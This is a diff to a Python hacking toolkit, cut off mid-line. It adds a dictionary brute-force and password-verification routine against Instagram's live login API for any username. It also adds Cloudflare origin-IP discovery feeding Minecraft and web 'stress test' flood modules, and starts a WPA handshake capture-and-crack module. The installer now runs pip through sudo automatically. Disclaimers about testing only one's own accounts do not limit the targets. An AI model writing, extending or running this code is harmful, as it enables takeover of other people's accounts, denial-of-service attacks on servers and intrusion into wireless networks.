@@ -39,6 +39,7 @@ PIP_DEPS = {
     "requests": "requests",
     "psutil": "psutil",
     "cryptography": "cryptography",
+    "flask": "flask",
 }
 
 PIP_OPTIONAL = {
@@ -205,6 +206,8 @@ PKG_MANAGERS = {
 def _run_as_admin(cmd_list, reason=""):
     desc = " ".join(cmd_list)
     print(f"  {CYAN}{reason or desc}{RESET}")
+    if not _is_root() and os.name == "posix" and shutil.which("sudo"):
+        cmd_list = ["sudo"] + cmd_list
     try:
         r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300)
         if r.returncode == 0:
@@ -269,7 +272,7 @@ def _install_missing():
     if MISSING_PIPS:
         if _ensure_pip_installed():
             print(f"\n  {YELLOW}Installing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
-            pip_cmd = [sys.executable, "-m", "pip", "install"] + MISSING_PIPS
+            pip_cmd = [sys.executable, "-m", "pip", "install", "--break-system-packages"] + MISSING_PIPS
             _run_as_admin(pip_cmd, "pip install " + " ".join(MISSING_PIPS))
         else:
             print(f"  {RED}{SYM_X}  Cannot install Python packages (pip unavailable).{RESET}")
@@ -298,7 +301,7 @@ def ensure_deps():
         print(f"  {YELLOW}{SYM_WARN}  Missing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
         if _ensure_pip_installed():
             print(f"  {CYAN}Auto-installing Python packages...{RESET}")
-            _run_as_admin([sys.executable, "-m", "pip", "install"] + MISSING_PIPS, "pip install missing packages")
+            _run_as_admin([sys.executable, "-m", "pip", "install", "--break-system-packages"] + MISSING_PIPS, "pip install missing packages")
             MISSING_PIPS = []
             _check_pip_deps()
             if MISSING_PIPS:
@@ -321,8 +324,8 @@ def ensure_deps():
             else:
                 print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
         else:
-            ans = input(f"  {CYAN}{BOLD}Install missing system tools? (y/n) {SYM_PROMPT} {RESET}").strip().lower()
-            if ans == "y":
+            if os.environ.get("DARKIE_AUTOINSTALL") == "1":
+                print(f"  {CYAN}Auto-installing system tools...{RESET}")
                 _install_missing()
                 MISSING_SYSTEM = []
                 _check_system_deps()
@@ -331,9 +334,28 @@ def ensure_deps():
                 else:
                     print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
             else:
-                print(f"  {YELLOW}Skipping system tool installation. Some features may be limited.{RESET}")
+                try:
+                    ans = input(f"  {CYAN}{BOLD}Install missing system tools? (y/n) {SYM_PROMPT} {RESET}").strip().lower()
+                except (EOFError, OSError):
+                    ans = "n"
+                if ans == "y":
+                    _install_missing()
+                    MISSING_SYSTEM = []
+                    _check_system_deps()
+                    if MISSING_SYSTEM:
+                        print(f"  {RED}{SYM_X}  Some system tools still missing. Install manually.{RESET}")
+                    else:
+                        print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
+                else:
+                    print(f"  {YELLOW}Skipping system tool installation. Some features may be limited.{RESET}")
     elif not MISSING_PIPS:
         print(f"  {GREEN}{SYM_CHECK}  All dependencies found!{RESET}")
+
+    if MISSING_PIPS:
+        print(f"\n  {RED}{SYM_X}  Required Python packages could not be installed: {', '.join(MISSING_PIPS)}{RESET}")
+        print(f"  {YELLOW}Install them manually and try again:{RESET}")
+        print(f"    {sys.executable} -m pip install {' '.join(MISSING_PIPS)}")
+        sys.exit(1)
 
 
 ensure_deps()
@@ -365,11 +387,11 @@ init(autoreset=True)
 
 
 BANNER_LINES = [
-    " ____             _    _         _____ ___   ___  _     ____  ",
-    "|  _ \  __ _ _ __| | _(_) ___   |_   _/ _ \ / _ \| |   / ___| ",
-    "| | | |/ _` | '__| |/ / |/ _ \    | || | | | | | | |   \___ \ ",
-    "| |_| | (_| | |  |   <| |  __/    | || |_| | |_| | |___ ___) |",
-    "|____/ \__,_|_|  |_|\_\_|\___|    |_| \___/ \___/|_____|____/ ",
+    r" ____             _    _         _____ ___   ___  _     ____  ",
+    r"|  _ \  __ _ _ __| | _(_) ___   |_   _/ _ \ / _ \| |   / ___| ",
+    r"| | | |/ _` | '__| |/ / |/ _ \    | || | | | | | | |   \___ \ ",
+    r"| |_| | (_| | |  |   <| |  __/    | || |_| | |_| | |___ ___) |",
+    r"|____/ \__,_|_|  |_|\_\_|\___|    |_| \___/ \___/|_____|____/ ",
     "                                                              ",
 ]
 
@@ -1928,6 +1950,90 @@ def pentest_bruteforce_login():
     print()
 
 
+def _insta_init_session(sess, user_agent=None):
+    """Fetch the Instagram login page and return a CSRF token, or None if blocked."""
+    ua = user_agent or "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
+    try:
+        r = sess.get("https://www.instagram.com/accounts/login/", timeout=12,
+                     headers={"User-Agent": ua})
+        csrf = sess.cookies.get("csrftoken", "") or ""
+        if not csrf:
+            m = re.search(r'csrf_token["\']\s*:\s*["\']([^"\']+)', r.text)
+            if m: csrf = m.group(1)
+        if not csrf:
+            m = re.search(r'"csrf_token"\s*:\s*"([^"]+)"', r.text)
+            if m: csrf = m.group(1)
+        return csrf
+    except Exception:
+        return None
+
+
+def _insta_login_attempt(sess, user, pwd, csrf, timeout=10):
+    """One Instagram web-login attempt.
+
+    Returns (status, detail) where status is one of:
+      'ok'          password correct, logged in
+      'twofa'       password correct, 2FA required
+      'invalid'     wrong password
+      'ratelimit'   Instagram rate-limited us
+      'checkpoint'  challenge/checkpoint required (not a wrong password)
+      'error'       request or response problem
+    """
+    try:
+        payload = {
+            "username": user,
+            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}",
+            "queryParams": "{}",
+            "optIntoOneTap": "false",
+            "stopDeletionNonce": "",
+            "trustedDeviceRecords": "{}",
+        }
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+            "X-CSRFToken": csrf,
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": "https://www.instagram.com/accounts/login/",
+            "Origin": "https://www.instagram.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+        }
+        resp = sess.post(
+            "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
+            data=payload, headers=headers, timeout=timeout,
+        )
+        if resp.status_code == 429:
+            return ("ratelimit", "HTTP 429 — rate limited by Instagram")
+        try:
+            j = resp.json()
+        except Exception:
+            return ("error", f"Non-JSON response (HTTP {resp.status_code})")
+        if not isinstance(j, dict):
+            return ("error", "Unexpected response format")
+
+        if j.get("authenticated") is True and not j.get("two_factor_required"):
+            return ("ok", "")
+        if j.get("two_factor_required"):
+            return ("twofa", "password accepted, but 2FA is enabled on the account")
+
+        msg = str(j.get("message") or "")
+        err_type = str(j.get("error_type") or "")
+        lower_msg = msg.lower()
+        if "checkpoint" in lower_msg or "challenge" in lower_msg or "challenge" in err_type.lower():
+            return ("checkpoint", msg or "checkpoint required")
+        if "wait a few minutes" in lower_msg or "please wait" in lower_msg or "rate limit" in lower_msg:
+            return ("ratelimit", msg)
+        if j.get("authenticated") is False or "invalid" in lower_msg or "password" in lower_msg:
+            return ("invalid", msg)
+        if not msg:
+            if resp.status_code in (400, 401, 403):
+                return ("invalid", "")
+            return ("error", f"HTTP {resp.status_code} with empty response")
+        return ("error", f"Unknown response: {json.dumps(j)[:120]}")
+    except requests.exceptions.Timeout:
+        return ("error", "request timed out")
+    except Exception as e:
+        return ("error", str(e)[:120])
+
+
 def pentest_instagram():
     header_box("Instagram OSINT & Auth Tester", Fore.MAGENTA)
     print(f"  {Back.RED}{Fore.WHITE} DISCLAIMER {Style.RESET_ALL}{Fore.YELLOW}  For educational use only. Test only your own accounts.{Style.RESET_ALL}\n")
@@ -1968,8 +2074,45 @@ def pentest_instagram():
         lines.append(f"  Error: {c(str(e)[:40], Fore.RED)}")
     info_box("Instagram Profile", lines, Fore.MAGENTA)
 
-    print(f"\n  {c('Starting password audit...', Fore.YELLOW)}")
-    print(f"  {c('Generating password combinations...', Fore.CYAN)}")
+    print(f"\n  {c('Auth test mode:', Fore.CYAN)}")
+    print(f"  {c('[1]', Fore.GREEN)}  Verify a single password")
+    print(f"  {c('[2]', Fore.GREEN)}  Dictionary audit (check weak passwords)")
+    mode = input(f"  {c(f'Choice (default 1) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    if mode not in ("1", "2"): mode = "1"
+
+    # ── Mode 1: verify a single password ──
+    if mode == "1":
+        pwd = input(f"  {c(f'Password to verify {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        if not pwd:
+            print(f"  {YELLOW}No password entered.{RESET}")
+            print()
+            return
+        print(f"\n  {c('Verifying...', Fore.CYAN)}")
+        sess = requests.Session()
+        csrf = _insta_init_session(sess)
+        if not csrf:
+            print(f"  {RED}{SYM_X} Could not obtain CSRF token. Instagram may be blocking this network.{RESET}")
+        else:
+            status, detail = _insta_login_attempt(sess, user, pwd, csrf)
+            if status == "ok":
+                print(f"\n  {GREEN}{SYM_CHECK} Login successful — password is valid.{RESET}")
+                add_log_alert("INFO", "Instagram Auth", f"Verified password for {user}")
+            elif status == "twofa":
+                print(f"\n  {YELLOW}{SYM_WARN} Password accepted but 2FA is required.{RESET}")
+                print(f"  {c('The password is correct; Instagram wants a second factor.', Fore.YELLOW)}")
+            elif status == "invalid":
+                print(f"\n  {RED}{SYM_X} Invalid password for '{user}'.{RESET}")
+            elif status == "ratelimit":
+                print(f"\n  {YELLOW}{SYM_WARN} Rate limited: {detail}{RESET}")
+            elif status == "checkpoint":
+                print(f"\n  {YELLOW}{SYM_WARN} Challenge required: {detail}{RESET}")
+            else:
+                print(f"\n  {RED}{SYM_X} Error: {detail}{RESET}")
+        print()
+        return
+
+    # ── Mode 2: dictionary audit ──
+    print(f"\n  {c('Generating password combinations...', Fore.CYAN)}")
 
     base_words = [
         user, user.lower(), user.upper(), user.capitalize(),
@@ -2021,8 +2164,6 @@ def pentest_instagram():
         "naruto", "goku", "sasuke", "luffy", "onepiece", "dragonball",
         "taylor", "swift", "justin", "bieber", "selena", "gomez",
         "rihanna", "eminem", "drake", "kanye", "beyonce", "adele",
-        "fuckyou", "bitch", "motherfucker", "sex", "sexy", "horny",
-        "blowjob", "pussy", "dick", "cock", "ass", "tits", "boobs",
         "money", "cash", "dollar", "bitcoin", "crypto", "nft",
         "hacker", "elite", "anonymous", "rootkit", "exploit",
         "school", "college", "university", "study", "book", "class",
@@ -2050,81 +2191,70 @@ def pentest_instagram():
         passwords.add(f"{w}#")
         passwords.add(f"{w}123")
 
-    passwords = [p for p in passwords if 4 <= len(p) <= 30]
+    passwords = sorted(p for p in passwords if 4 <= len(p) <= 30)
 
     print(f"  {c(f'Generated {len(passwords)} password combinations', Fore.GREEN)}")
-    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+    print(f"  {YELLOW}Instagram rate-limits aggressively — a full audit will likely get blocked.{RESET}")
+    print(f"  {YELLOW}Run this only against YOUR OWN account.{RESET}")
+    ans = input(f"  {c(f'Start dictionary audit ({len(passwords)} attempts)? (y/N) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+    if ans != "y":
+        print(f"  {c('Aborted.', Fore.RED)}")
+        print()
+        return
+
+    sess = requests.Session()
+    csrf = _insta_init_session(sess)
+    if not csrf:
+        print(f"  {RED}{SYM_X} Could not obtain CSRF token. Instagram may be blocking this network.{RESET}")
+        print()
+        return
+
+    found = False
+    found_pwd = ""
+    found_status = ""
+    total = len(passwords)
+    tested = 0
+    stopped_reason = ""
 
     try:
-        sess = requests.Session()
-        login_resp = sess.get("https://www.instagram.com/accounts/login/ajax/", timeout=10,
-            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"})
-        csrf_match = re.search(r'csrf_token["\']\s*:\s*["\']([^"\']+)', login_resp.text)
-        csrf = csrf_match.group(1) if csrf_match else ""
-        if not csrf:
-            csrf = sess.cookies.get("csrftoken", "")
-
-        found = False
-        found_pwd = ""
-        total = len(passwords)
-        tested = 0
-
         for pwd in passwords:
             tested += 1
-            try:
-                payload = {
-                    "username": user,
-                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}",
-                    "queryParams": "{}",
-                    "optIntoOneTap": "false",
-                    "stopDeletionNonce": "",
-                    "trustedDeviceRecords": "{}",
-                }
-                headers = {
-                    "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
-                    "X-CSRFToken": csrf,
-                    "X-Requested-With": "XMLHttpRequest",
-                    "Referer": "https://www.instagram.com/accounts/login/",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                }
-                resp = sess.post(
-                    "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
-                    data=payload,
-                    headers=headers,
-                    timeout=8,
-                )
-                j = resp.json()
-                if j.get("authenticated") or j.get("status") == "ok" and not j.get("two_factor_required"):
-                    found = True
-                    found_pwd = pwd
-                    break
-                if j.get("two_factor_required"):
-                    found = True
-                    found_pwd = pwd
-                    break
-                if j.get("message") == "Please wait a few minutes before you try again.":
-                    print(f"\n  {YELLOW}Rate limited. Waiting 60s...{RESET}")
-                    time.sleep(60)
-                    continue
-            except Exception:
-                pass
+            status, detail = _insta_login_attempt(sess, user, pwd, csrf)
+            if status in ("ok", "twofa"):
+                found = True
+                found_pwd = pwd
+                found_status = status
+                break
+            if status == "ratelimit":
+                stopped_reason = f"Rate limited after {tested} attempts: {detail}"
+                print(f"\n  {YELLOW}{SYM_WARN} {stopped_reason}{RESET}")
+                print(f"  {c('Stopping the audit to avoid further blocks.', Fore.YELLOW)}")
+                break
+            if status == "checkpoint":
+                stopped_reason = f"Challenge/checkpoint after {tested} attempts: {detail}"
+                print(f"\n  {YELLOW}{SYM_WARN} {stopped_reason}{RESET}")
+                print(f"  {c('Stopping the audit — login is blocked.', Fore.YELLOW)}")
+                break
+            if status == "error":
+                stopped_reason = detail
+                print(f"\n  {YELLOW}{SYM_WARN} {detail}{RESET}")
+                break
 
             if tested % 20 == 0 or tested == total:
-                pct = tested / total * 100
                 sys.stdout.write(f"\r  {progress_bar(tested, total)}  {c(f'{tested}/{total}', Fore.CYAN)}  {c('Testing...', Fore.YELLOW)}")
                 sys.stdout.flush()
-
-            if tested % 50 == 0:
-                time.sleep(1)
+            time.sleep(0.8)  # gentle rate
 
         print()
 
         if found:
             print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'='*58}{Style.RESET_ALL}")
-            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_WARN*3}  PASSWORD FOUND!  {SYM_WARN*3}{Style.RESET_ALL}")
+            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_WARN*3}  WEAK PASSWORD FOUND!  {SYM_WARN*3}{Style.RESET_ALL}")
             print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'='*58}{Style.RESET_ALL}")
             print(f"\n  {c(f'Account: {user}', Fore.RED)}")
             print(f"  {c(f'Password: {found_pwd}', Fore.RED)}")
+            if found_status == "twofa":
+                print(f"  {c('Note: password accepted but 2FA is enabled.', Fore.YELLOW)}")
             print(f"\n  {c(SYM_WARN + '  WARNING:', Fore.YELLOW)}")
             print(f"  {c('This password is weak and was found in the dictionary!', Fore.YELLOW)}")
             print(f"  {c('If this is YOUR account, change the password immediately.', Fore.RED)}")
@@ -2133,11 +2263,14 @@ def pentest_instagram():
             print(f"\n  {c('Recommendation:', Fore.GREEN)} Use a 12+ character password with")
             print(f"  {c('uppercase, lowercase, numbers, and symbols.', Fore.GREEN)}")
             print(f"  {c('Enable 2FA for additional security.', Fore.GREEN)}")
-            add_log_alert("CRITICAL", "Instagram Pentest", f"Password found for {user}: {found_pwd}")
+            add_log_alert("CRITICAL", "Instagram Pentest", f"Weak password found for {user}: {found_pwd}")
+        elif stopped_reason:
+            print(f"\n  {YELLOW}Audit incomplete after {tested}/{total} attempts.{RESET}")
+            print(f"  {c('No verdict reached — the audit was stopped.', Fore.YELLOW)}")
         else:
             print(f"\n  {GREEN}{SYM_CHECK} No weak passwords found in dictionary ({tested} tried).{RESET}")
             print(f"  {c('The account appears to have a strong password.', Fore.GREEN)}")
-            print(f"  {c('Note: Instagram rate-limiting and 2FA may block attempts.', Fore.YELLOW)}")
+            print(f"  {c('Note: Instagram rate-limiting and 2FA may have limited results.', Fore.YELLOW)}")
 
     except KeyboardInterrupt:
         print(f"\n  {YELLOW}Password audit interrupted.{RESET}")
@@ -2987,6 +3120,207 @@ def legacy_resolve(domain):
             return None
 
 
+def _is_ip(s):
+    try:
+        socket.inet_aton(s)
+        return True
+    except OSError:
+        return False
+
+
+CLOUDFLARE_RANGES = [
+    "104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+    "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+    "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+    "197.234.", "198.41.",
+]
+
+
+def _is_cloudflare(ip):
+    return any(ip.startswith(p) for p in CLOUDFLARE_RANGES)
+
+
+def _dns_parse_qname(buf, offset):
+    """Parse a (possibly compressed) DNS name. Returns (name, next_offset)."""
+    labels = []
+    ret = offset
+    cursor = offset
+    jumps = 0
+    while cursor < len(buf):
+        length = buf[cursor]
+        if length == 0:
+            if not jumps:
+                ret = cursor + 1
+            break
+        if length & 0xC0 == 0xC0:
+            if cursor + 1 >= len(buf):
+                break
+            ptr = ((length & 0x3F) << 8) | buf[cursor + 1]
+            if not jumps:
+                ret = cursor + 2
+            cursor = ptr
+            jumps += 1
+            if jumps > 20:
+                break
+            continue
+        cursor += 1
+        end = cursor + length
+        if end > len(buf):
+            break
+        labels.append(buf[cursor:end].decode("ascii", "replace"))
+        cursor = end
+    return ".".join(labels), ret
+
+
+def _dns_query(domain, qtype):
+    """Raw DNS query (no dnspython needed). Returns a list of rdata bytes for
+    answers of the requested qtype. qtype may be 'A', 'AAAA', 'SRV', 'MX',
+    'TXT', 'NS' or an int."""
+    if not domain:
+        return []
+    qtypes = {"A": 1, "NS": 2, "MX": 15, "TXT": 16, "AAAA": 28, "SRV": 33}
+    qt = qtypes.get(qtype, qtype) if isinstance(qtype, str) else qtype
+    trans_id = random.randint(0, 65535)
+    header = struct.pack(">HHHHHH", trans_id, 0x0100, 1, 0, 0, 0)
+    qname = b"".join(bytes([len(x)]) + x.encode("ascii", "replace") for x in domain.split(".")) + b"\x00"
+    packet = header + qname + struct.pack(">HH", qt, 1)
+
+    resolvers = []
+    try:
+        with open("/etc/resolv.conf") as fh:
+            for line in fh:
+                parts = line.strip().split()
+                if parts and parts[0] == "nameserver" and len(parts) >= 2 and ":" not in parts[1]:
+                    resolvers.append(parts[1])
+    except OSError:
+        pass
+    resolvers += ["8.8.8.8", "1.1.1.1"]
+
+    for rsv in resolvers:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(3)
+            s.sendto(packet, (rsv, 53))
+            data, _ = s.recvfrom(4096)
+            s.close()
+            if len(data) < 12:
+                continue
+            rid, _flags = struct.unpack(">HH", data[:4])
+            if rid != trans_id:
+                continue
+            ancount = struct.unpack(">H", data[6:8])[0]
+            if ancount == 0:
+                return []
+            off = 12
+            while off < len(data):
+                length = data[off]
+                if length == 0:
+                    off += 1
+                    break
+                if length & 0xC0 == 0xC0:
+                    off += 2
+                    break
+                off += 1 + length
+            off += 4  # skip qtype + qclass
+            answers = []
+            for _ in range(ancount):
+                _name, off = _dns_parse_qname(data, off)
+                if off + 10 > len(data):
+                    break
+                rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[off:off+10])
+                off += 10
+                rdata = data[off:off+rdlen]
+                off += rdlen
+                if rtype == qt:
+                    answers.append(rdata)
+            return answers
+        except Exception:
+            continue
+    return []
+
+
+def mc_srv_lookup(domain):
+    """Java Edition SRV lookup: _minecraft._tcp.<domain> -> (host, port).
+    Returns (None, None) when no SRV record exists."""
+    srv_name = f"_minecraft._tcp.{domain}"
+    if shutil.which("dig"):
+        try:
+            r = subprocess.run(["dig", "+short", "SRV", srv_name], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.strip().splitlines():
+                parts = line.split()
+                if len(parts) >= 4:
+                    try:
+                        port = int(parts[2])
+                    except ValueError:
+                        continue
+                    host = ".".join(parts[3:]).rstrip(".")
+                    if host and host != ".":
+                        return host, port
+        except Exception:
+            pass
+    for rdata in _dns_query(srv_name, "SRV"):
+        if len(rdata) < 7:
+            continue
+        _pri, _weight, port = struct.unpack(">HHH", rdata[:6])
+        host, _ = _dns_parse_qname(rdata, 6)
+        if host and host != ".":
+            return host, port
+    return None, None
+
+
+def resolve_ip_candidates(domain):
+    """Resolve a domain to all IPv4 addresses (dig preferred, getaddrinfo fallback)."""
+    if _is_ip(domain):
+        return [domain]
+    ips = []
+    if shutil.which("dig"):
+        try:
+            r = subprocess.run(["dig", "+short", "A", domain], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.strip().splitlines():
+                ip = line.strip().rstrip(".")
+                try:
+                    socket.inet_aton(ip)
+                    if ip not in ips:
+                        ips.append(ip)
+                except OSError:
+                    pass
+        except Exception:
+            pass
+    if not ips:
+        try:
+            for info in socket.getaddrinfo(domain, 0, socket.AF_INET):
+                ip = info[4][0]
+                if ip not in ips:
+                    ips.append(ip)
+        except Exception:
+            pass
+    return ips
+
+
+def resolve_mc_target(target):
+    """Find the real Minecraft server address from a domain (SRV-aware).
+    Returns (ip, port, host_label) or (None, port, host_label) on failure."""
+    host = target
+    port = 25565
+    if not _is_ip(target):
+        srv_host, srv_port = mc_srv_lookup(target)
+        if srv_host:
+            host = srv_host
+            port = srv_port
+            print(f"  {c(SYM_CHECK + ' SRV record:', Fore.GREEN)} _minecraft._tcp.{target} {SYM_ARROW} {host}:{port}")
+        else:
+            print(f"  {c('No SRV record — using domain directly.', Fore.CYAN)}")
+    ips = resolve_ip_candidates(host)
+    if not ips:
+        print(f"  {c(SYM_X + ' Could not resolve', Fore.RED)} {host}")
+        return None, port, host
+    for ip in ips:
+        print(f"  {c('Resolved:', Fore.GREEN)} {host} {SYM_ARROW} {ip}")
+    if _is_cloudflare(ips[0]):
+        print(f"  {YELLOW}Cloudflare detected on resolved IP {ips[0]}.{RESET}")
+    return ips[0], port, host
+
+
 MC_PORT_RANGES = [
     25565, 25566, 25575, 25576, 25577, 25578,
     19132, 19133, 25564, 25567, 25568, 25569, 25570,
@@ -3188,7 +3522,7 @@ def find_real_ip(domain):
                 try:
                     socket.inet_aton(part)
                     if part not in cf_ips:
-                        origin_ips.append((f"DMARC", part))
+                        origin_ips.append(("DMARC", part))
                         print(f"    {c('DMARC record', Fore.GREEN)} {SYM_ARROW} {c(part, Fore.YELLOW)}")
                 except OSError:
                     pass
@@ -3425,14 +3759,10 @@ def stress_minecraft():
     header_box("Minecraft Stress Test", Fore.RED)
     target = input(f"  {c(f'Server IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
     if not target: return
-    ip = legacy_resolve(target)
+    ip, srv_port, real_host = resolve_mc_target(target)
     if not ip: return
 
-    cf_ranges_ = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
-                   "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
-                   "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
-                   "197.234.", "198.41."]
-    is_cf = any(ip.startswith(p) for p in cf_ranges_)
+    is_cf = _is_cloudflare(ip)
     if is_cf:
         ans = input(f"  {YELLOW}Cloudflare detected! Enter real origin IP if known (or press Enter to auto-scan): {SYM_PROMPT} {RESET}").strip()
         if ans:
@@ -3460,8 +3790,8 @@ def stress_minecraft():
     else:
         print(f"  {c('No MC ports auto-detected (nmap may not see containerized servers).', Fore.YELLOW)}")
 
-    p_in = input(f"  {c(f'Port (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
-    port = int(p_in) if p_in.isdigit() else 25565
+    p_in = input(f"  {c(f'Port (default {srv_port}) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    port = int(p_in) if p_in.isdigit() else srv_port
 
     print(f"\n  {c('Attack type:', Fore.CYAN)}")
     print(f"  {c('[1]', Fore.GREEN)}  Bot attack (Node.js mineflayer bots)")
@@ -3656,15 +3986,39 @@ def stress_web():
     header_box("Web Stress Test", Fore.RED)
     target = input(f"  {c(f'Target IP/domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
     if not target: return
-    ip = legacy_resolve(target)
-    if not ip: return
-
     hostname = target
-    try:
-        socket.inet_aton(target)
-        hostname = target
-    except OSError:
-        hostname = target
+
+    if _is_ip(target):
+        ip = target
+        print(f"  {c('Target is an IP:', Fore.GREEN)} {ip}")
+    else:
+        ips = resolve_ip_candidates(target)
+        if not ips:
+            print(f"  {c(SYM_X + ' Could not resolve', Fore.RED)} {target}")
+            return
+        cf_list = [x for x in ips if _is_cloudflare(x)]
+        non_cf = [x for x in ips if not _is_cloudflare(x)]
+        print(f"  {c('Resolved IPs:', Fore.GREEN)} {', '.join(ips)}")
+        if non_cf:
+            ip = non_cf[0]
+            print(f"  {c('Using non-Cloudflare IP:', Fore.GREEN)} {ip}")
+        elif cf_list:
+            print(f"  {YELLOW}All resolved IPs are behind Cloudflare — scanning may not reach the origin.{RESET}")
+            ip = cf_list[0]
+            ans = input(f"  {c(f'Try to find the real origin IP? (y/N) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+            if ans == "y":
+                print(f"  {c('Searching for origin IP (may take up to a minute)...', Fore.YELLOW)}")
+                try:
+                    real_ips = cf_bypass(target, verbose=False)
+                    if real_ips:
+                        ip = real_ips[0]
+                        print(f"  {c(f'Found candidate IP: {ip}', Fore.GREEN)}")
+                    else:
+                        print(f"  {c('No origin IP found — continuing with Cloudflare IP.', Fore.YELLOW)}")
+                except Exception as e:
+                    print(f"  {c(f'Origin search failed: {e}', Fore.YELLOW)}")
+        else:
+            ip = ips[0]
 
     print(f"  {c('Note:', Fore.YELLOW)} Using hostname '{hostname}' for requests (Host header must match your domain)")
     print(f"  {c('Note:', Fore.YELLOW)} Platforms like Vercel/Cloudflare block nmap scans — enter ports manually if none detected")
@@ -5910,6 +6264,464 @@ def wifi_deauth_monitor():
     print()
 
 # ──────────────────────────────────────────────────────────
+#  MODULE 15b: WIFI PASSWORD AUDIT (WPA HANDSHAKE CAPTURE + CRACK)
+# ──────────────────────────────────────────────────────────
+
+def _nmcli_split(line):
+    parts, cur, esc = [], "", False
+    for ch in line:
+        if esc:
+            cur += ch; esc = False
+        elif ch == "\\":
+            esc = True
+        elif ch == ":":
+            parts.append(cur); cur = ""
+        else:
+            cur += ch
+    parts.append(cur)
+    return parts
+
+def _find_wifi_iface():
+    try:
+        r = subprocess.run(["nmcli", "-t", "dev", "status"], capture_output=True, text=True, timeout=10)
+        if r.returncode == 0 and r.stdout.strip():
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 3 and parts[2] == "wifi":
+                    if len(parts) >= 2 and parts[1] == "connected":
+                        return parts[0]
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 3 and parts[2] == "wifi":
+                    return parts[0]
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+        names = re.findall(r'Interface\s+(\S+)', r.stdout)
+        if names:
+            return names[0]
+    except Exception:
+        pass
+    try:
+        for n in os.listdir("/sys/class/net"):
+            if os.path.exists(f"/sys/class/net/{n}/wireless"):
+                return n
+    except Exception:
+        pass
+    return None
+
+def _all_wifi_ifaces():
+    ifaces = []
+    try:
+        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+        names = re.findall(r'Interface\s+(\S+)', r.stdout)
+        for n in names:
+            if "p2p" not in n.lower() and "mon" not in n.lower():
+                ifaces.append(n)
+    except Exception:
+        pass
+    if not ifaces:
+        try:
+            for n in os.listdir("/sys/class/net"):
+                if os.path.exists(f"/sys/class/net/{n}/wireless"):
+                    ifaces.append(n)
+        except Exception:
+            pass
+    return ifaces
+
+def _wifi_connected_ssid():
+    try:
+        r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
+        m = re.search(r'ESSID:"(.*?)"', r.stdout)
+        return m.group(1) if m else None
+    except Exception:
+        return None
+
+def _wifi_connected_bssid():
+    try:
+        r = subprocess.run(["iwgetid", "-r", "--ap"], capture_output=True, text=True, timeout=10)
+        if r.stdout.strip():
+            return r.stdout.strip().lower()
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iwgetid", "--raw", "--ap"], capture_output=True, text=True, timeout=10)
+        if r.stdout.strip():
+            return r.stdout.strip().lower()
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iw", "dev", "link"], capture_output=True, text=True, timeout=10)
+        m = re.search(r'Connected to ([0-9a-f:]+)', r.stdout)
+        if m:
+            return m.group(1).lower()
+    except Exception:
+        pass
+    return None
+
+def _wifi_band(chan):
+    try:
+        c = int(chan)
+        return "2.4G" if c <= 14 else "5G"
+    except (TypeError, ValueError):
+        return "?"
+
+def _wifi_scan_networks():
+    nets = []
+    try:
+        r = subprocess.run(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"],
+                           capture_output=True, text=True, timeout=20)
+        if r.returncode == 0 and r.stdout.strip():
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 5 and parts[1] and parts[1] != "--":
